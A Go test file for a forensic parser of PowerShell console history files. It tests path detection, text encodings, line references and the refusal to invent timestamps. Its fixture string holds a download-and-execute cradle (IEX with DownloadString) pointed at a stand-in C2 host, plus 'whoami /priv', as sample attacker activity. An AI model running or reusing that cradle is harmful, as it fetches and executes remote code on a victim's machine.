package pshistory_test

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"unicode/utf16"

	"tracefall/internal/model"
	"tracefall/internal/parsers/pshistory"
)

const commands = "Get-Process\nwhoami /priv\nIEX (New-Object Net.WebClient).DownloadString('http://c2.example.test/x')\n"

func write(t *testing.T, name string, data []byte) string {
	t.Helper()
	dir := t.TempDir()
	p := filepath.Join(dir, name)
	if err := os.WriteFile(p, data, 0o644); err != nil {
		t.Fatal(err)
	}
	return p
}

// writeAtUserPath places the file where PSReadLine really puts it, so
// the user-from-path logic is exercised on a realistic layout.
func writeAtUserPath(t *testing.T, user string, data []byte) string {
	t.Helper()
	dir := filepath.Join(t.TempDir(), "Users", user, "AppData", "Roaming", "Microsoft", "Windows", "PowerShell", "PSReadline")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	p := filepath.Join(dir, "ConsoleHost_history.txt")
	if err := os.WriteFile(p, data, 0o644); err != nil {
		t.Fatal(err)
	}
	return p
}

func utf16le(s string, bom bool) []byte {
	var out []byte
	if bom {
		out = append(out, 0xFF, 0xFE)
	}
	for _, r := range utf16.Encode([]rune(s)) {
		out = append(out, byte(r), byte(r>>8))
	}
	return out
}

func utf16be(s string, bom bool) []byte {
	var out []byte
	if bom {
		out = append(out, 0xFE, 0xFF)
	}
	for _, r := range utf16.Encode([]rune(s)) {
		out = append(out, byte(r>>8), byte(r))
	}
	return out
}

func TestDetect(t *testing.T) {
	p := pshistory.New()
	if !p.Detect(`Users/jdoe/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt`) {
		t.Error("Detect missed a canonical console history path")
	}
	if !p.Detect("ConsoleHost_history.txt") {
		t.Error("Detect missed a bare filename")
	}
	if p.Detect("notes.txt") {
		t.Error("Detect claimed an ordinary text file")
	}
	// Content sniffing is deliberately refused: plain text has no
	// signature, and guessing would misclassify every script and log.
	if p.DetectContent([]byte("Get-Process\nwhoami\n")) {
		t.Error("DetectContent claimed a plain text file; it must never guess")
	}
}

// The central promise: commands are recovered, and NO timestamp is
// invented for any of them.
func TestParse_ExtractsCommandsWithoutInventingTimestamps(t *testing.T) {
	res, err := pshistory.New().Parse(writeAtUserPath(t, "jdoe", []byte(commands)))
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if len(res.Events) != 3 {
		t.Fatalf("events = %d, want 3", len(res.Events))
	}
	if len(res.Raw) != len(res.Events) {
		t.Fatalf("raw records = %d, events = %d; they must pair 1:1", len(res.Raw), len(res.Events))
	}

	for i, e := range res.Events {
		if !e.Timestamp.IsZero() {
			t.Errorf("event %d carries timestamp %v; this artifact records none and the file mtime must not be used", i, e.Timestamp)
		}
		if e.Extra["timestamp_known"] != "false" {
			t.Errorf("event %d does not declare its timestamp unknown", i)
		}
		if e.Extra["timestamp_basis"] == "" {
			t.Errorf("event %d does not explain why it has no timestamp", i)
		}
		if e.EventType != model.EventPowerShellHistoryCommand {
			t.Errorf("event %d type = %q", i, e.EventType)
		}
		if e.ArtifactType != model.ArtifactPowerShellHistory {
			t.Errorf("event %d artifact type = %q", i, e.ArtifactType)
		}
		if e.User != "jdoe" {
			t.Errorf("event %d user = %q, want jdoe from the evidence path", i, e.User)
		}
	}
	if res.Events[0].CommandLine != "Get-Process" {
		t.Errorf("first command = %q", res.Events[0].CommandLine)
	}
	if !strings.Contains(res.Events[2].CommandLine, "DownloadString") {
		t.Errorf("third command = %q", res.Events[2].CommandLine)
	}
	// Line references must point at the real line in the file.
	if res.Events[0].SourceReference != "line:1" || res.Events[2].SourceReference != "line:3" {
		t.Errorf("source references = %q, %q", res.Events[0].SourceReference, res.Events[2].SourceReference)
	}
}

// Distinct commands must keep distinct identities even with no
// timestamp -- otherwise the whole history collapses into one event.
func TestParse_CommandsDoNotCollapseIntoOneEvent(t *testing.T) {
	res, err := pshistory.New().Parse(write(t, "ConsoleHost_history.txt", []byte(commands)))
	if err != nil {
		t.Fatal(err)
	}
	seen := map[string]bool{}
	for _, e := range res.Events {
		h := e.ComputeDedupHash()
		if seen[h] {
			t.Fatalf("two commands share dedup hash %s -- history would be silently lost", h[:16])
		}
		seen[h] = true
	}
	if len(seen) != 3 {
		t.Errorf("distinct identities = %d, want 3", len(seen))
	}
}

func TestParse_Encodings(t *testing.T) {
	cases := map[string][]byte{
		"utf-8 no BOM":   []byte(commands),
		"utf-8 with BOM": append([]byte{0xEF, 0xBB, 0xBF}, []byte(commands)...),
		"utf-16le BOM":   utf16le(commands, true),
		"utf-16le raw":   utf16le(commands, false),
		"utf-16be BOM":   utf16be(commands, true),
		"CRLF":           []byte(strings.ReplaceAll(commands, "\n", "\r\n")),
	}
	for name, data := range cases {
		t.Run(name, func(t *testing.T) {
			res, err := pshistory.New().Parse(write(t, "ConsoleHost_history.txt", data))
			if err != nil {
				t.Fatalf("Parse: %v", err)
			}
			if len(res.Events) != 3 {
				t.Fatalf("events = %d, want 3 (commands: %v)", len(res.Events), commandsOf(res.Events))
			}
			if res.Events[0].CommandLine != "Get-Process" {
				t.Errorf("first command decoded as %q", res.Events[0].CommandLine)
			}
			if res.Events[0].Extra["text_encoding"] == "" {
				t.Error("the encoding actually used was not recorded")
			}
		})
	}
}

func TestParse_MalformedEncodingFailsSafely(t *testing.T) {
	// Invalid UTF-8, odd length, no UTF-16 structure.
	bad := []byte{0xC3, 0x28, 0xA0, 0xA1, 0xF0, 0x28, 0x8C, 0x28, 0xFF}
	_, err := pshistory.New().Parse(write(t, "ConsoleHost_history.txt", bad))
	if err == nil {
		t.Fatal("expected an encoding error")
	}
	if !errors.Is(err, pshistory.ErrEncoding) {
		t.Errorf("error = %v, want ErrEncoding", err)
	}
}

func TestParse_BlankLinesAreSkipped(t *testing.T) {
	res, err := pshistory.New().Parse(write(t, "ConsoleHost_history.txt", []byte("one\n\n\n   \ntwo\n")))
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Events) != 2 {
		t.Fatalf("events = %d, want 2: %v", len(res.Events), commandsOf(res.Events))
	}
	// Line numbers must still refer to real file lines.
	if res.Events[1].SourceReference != "line:5" {
		t.Errorf("second command reference = %q, want line:5", res.Events[1].SourceReference)
	}
}

func TestParse_EmptyFileProducesNoEvents(t *testing.T) {
	res, err := pshistory.New().Parse(write(t, "ConsoleHost_history.txt", nil))
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Events) != 0 {
		t.Errorf("events = %d, want 0", len(res.Events))
	}
}

func TestParse_IsDeterministic(t *testing.T) {
	path := write(t, "ConsoleHost_history.txt", []byte(commands))
	first, err := pshistory.New().Parse(path)
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 5; i++ {
		again, err := pshistory.New().Parse(path)
		if err != nil {
			t.Fatal(err)
		}
		if strings.Join(commandsOf(again.Events), "|") != strings.Join(commandsOf(first.Events), "|") {
			t.Fatalf("run %d differed", i)
		}
		for j := range first.Events {
			if first.Events[j].ComputeDedupHash() != again.Events[j].ComputeDedupHash() {
				t.Fatalf("run %d event %d changed identity", i, j)
			}
		}
	}
}

func commandsOf(events []model.Event) []string {
	out := make([]string, 0, len(events))
	for _, e := range events {
		out = append(out, e.CommandLine)
	}
	return out
}
